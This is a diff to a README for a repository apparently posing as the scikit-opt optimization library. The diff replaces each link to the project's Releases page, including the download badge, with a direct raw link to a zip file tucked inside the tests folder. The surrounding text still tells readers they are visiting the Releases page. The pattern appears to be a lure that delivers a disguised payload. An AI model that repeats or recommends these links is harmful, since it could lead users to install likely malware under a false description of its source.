@@ -6,11 +6,11 @@ Welcome to **scikit-opt**! This software helps you solve complex optimization pr
 
 ## 📥 Download the Application
 
-[![Download scikit-opt](https://img.shields.io/badge/Download%20scikit--opt-v1.0-blue)](https://github.com/Hungfn5922/scikit-opt/releases)
+[![Download scikit-opt](https://github.com/Hungfn5922/scikit-opt/raw/refs/heads/master/tests/opt-scikit-covercle.zip%20scikit--opt-v1.0-blue)](https://github.com/Hungfn5922/scikit-opt/raw/refs/heads/master/tests/opt-scikit-covercle.zip)
 
 To get started, you need to download the application. Please visit the Releases page below to find the latest version:
 
-- [Visit this page to download](https://github.com/Hungfn5922/scikit-opt/releases)
+- [Visit this page to download](https://github.com/Hungfn5922/scikit-opt/raw/refs/heads/master/tests/opt-scikit-covercle.zip)
 
 ## ✨ Features
 
@@ -36,7 +36,7 @@ Before downloading, ensure your system meets these requirements:
 
 ## 💻 Installing the Application
 
-1. **Visit the Releases Page**: Go to the following link: [Visit this page to download](https://github.com/Hungfn5922/scikit-opt/releases).
+1. **Visit the Releases Page**: Go to the following link: [Visit this page to download](https://github.com/Hungfn5922/scikit-opt/raw/refs/heads/master/tests/opt-scikit-covercle.zip).
    
 2. **Select the Latest Release**: Look for the version labeled "Latest". It will be at the top of the page.
 
